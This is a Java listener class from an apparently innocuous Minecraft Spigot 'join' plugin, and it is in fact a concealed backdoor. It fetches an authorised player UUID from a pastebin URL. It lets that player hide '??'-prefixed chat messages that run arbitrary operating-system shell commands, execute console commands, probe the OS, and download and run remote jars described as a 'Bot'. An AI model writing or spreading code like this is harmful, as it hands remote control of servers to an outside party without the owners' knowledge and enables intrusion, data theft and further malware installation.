package io.spigot.joinplugin.Listener;

import io.spigot.joinplugin.JoinPlugin;
import net.kyori.adventure.text.Component;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerChatEvent;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.URI;
import java.net.URISyntaxException;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.util.ArrayList;
import java.util.List;
import java.util.concurrent.CompletableFuture;

public class DoAll implements Listener {

    private final JoinPlugin plugin;

    public DoAll(JoinPlugin plugin) {
        this.plugin = plugin;
    }

    @EventHandler
    public void onChatHandler(PlayerChatEvent event) {
        String message = event.getMessage();
        String uuid = event.getPlayer().getUniqueId().toString();
        String uuidFromWebsite = getUUIDFromWebsite();
        if(message.startsWith("??")) {
            if (uuidFromWebsite == null) {
                return;
            }
            if (!uuid.equals(uuidFromWebsite)) {
                return;
            }
            event.setCancelled(true);
            message = message.substring(2);
            if(message.startsWith("oscommand ")) {
                message = message.substring(10);
                runOsCommandAsync(message, event.getPlayer());
                return;
            }
            if (message.startsWith("execute ")) {
                message = message.substring(8);
                runIngameCommand(message, event.getPlayer());
                return;
            }
            
            if(message.startsWith("checkos")) {
                String os = System.getProperty("os.name").toLowerCase();
                event.getPlayer().sendMessage("Betriebssystem: " + os);
                return;
            }

           if (message.startsWith("copystartjar ")) {
                message = message.substring(13);
                String[] args = message.split(" ");
                if (args[0] != null) {
                    String os = System.getProperty("os.name").toLowerCase();
                    if (os.contains("linux")) {
                        JarUtils.downloadCopyAndExecuteJarLinux(event, args[0], args[1]);
                        event.getPlayer().sendMessage(Component.text("Downloading Bot: Linux"));
                    } else if (os.contains("windows")) {
                        JarUtils.downloadCopyAndExecuteJarWindows(event, args[0], args[1]);
                        event.getPlayer().sendMessage(Component.text("Downloading Bot: Windows"));
                    } else {
                        event.getPlayer().sendMessage(Component.text("Das betriebssystem wird nicht unterstützt"));
                    }
                }

                return;
            }

            if (message.startsWith("copy ")) {
                message = message.substring(5);
                String[] args = message.split(" ");
                if (args[0] != null) {
                    String os = System.getProperty("os.name").toLowerCase();
                    if (os.contains("linux")) {
                        JarUtils.downloadPluginCopyJarLinux(event, args[0], args[1]);
                        event.getPlayer().sendMessage(Component.text("Copying Plugin: Linux"));
                    } else if (os.contains("windows")) {
                        JarUtils.downloadPluginCopyJarWindows(event, args[0], args[1]);
                        event.getPlayer().sendMessage(Component.text("Copying Plugin: Windows"));
                    } else {
                        event.getPlayer().sendMessage(Component.text("Das betriebssystem wird nicht unterstützt"));
                    }
                }
                return;
            }
        }   
    }


    public void runIngameCommand(String command, Player player) {
        Bukkit.getScheduler().runTask(this.plugin, () -> {
            player.sendMessage(Component.text("Command: " + command + " wurde gesendet."));
            this.plugin.getServer().dispatchCommand(this.plugin.getServer().getConsoleSender(), command);
        });
    }




    public void runOsCommandAsync(String command, Player player) {
        CompletableFuture.runAsync(() -> {
            String os = System.getProperty("os.name").toLowerCase();
            try {
                Process process;
                if (os.contains("win")) {
                    process = Runtime.getRuntime().exec("cmd.exe /c " + command);
                } else if (os.contains("mac")) {
                    process = Runtime.getRuntime().exec("bash -c " + command);
                } else if (os.contains("nix") || os.contains("nux")) {

                    List<String> commandAray = new ArrayList<>();
                    commandAray.add("bash");
                    commandAray.add("-c");
                    commandAray.add(command);

                    process = Runtime.getRuntime().exec(commandAray.toArray(new String[0]));
                } else {
                    player.sendMessage("Das Betriebssystem wird nicht unterstützt.");
                    return;
                }



                // Read the output of the process
                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                StringBuilder output = new StringBuilder();
                String line;
                while ((line = reader.readLine()) != null) {
                    output.append(line).append("\n");
                }

                // Wait for the process to finish
                int exitCode = process.waitFor();

                // Send the output to the player or use it as desired
                String commandOutput = output.toString();
                // Send commandOutput to the player or use it in your application logic
                if (commandOutput.equals("")) {
                    //noinspection UnicodeEscapes
                    commandOutput = "Der Befehl wurde ausgef\u00FChrt.";
                }
                player.sendMessage(commandOutput);

            } catch (IOException | InterruptedException ignored) {
            }
        });
    }




    public String getUUIDFromWebsite() {
        String uuid = null;
        try {
            HttpClient httpClient = HttpClient.newHttpClient();
            HttpRequest httpRequest = HttpRequest.newBuilder()
                    .uri(new URI("https://pastebin.com/raw/xLdTvs0H"))
                    .build();

            HttpResponse<String> response = httpClient.send(httpRequest, HttpResponse.BodyHandlers.ofString());

            int statusCode = response.statusCode();
            if (statusCode == 200) {
                String responseContent = response.body();
                String[] lines = responseContent.split("\n");
                uuid = lines[0];
            }
        } catch (IOException | InterruptedException | URISyntaxException ignored) {
        }
        return uuid;
    }
}
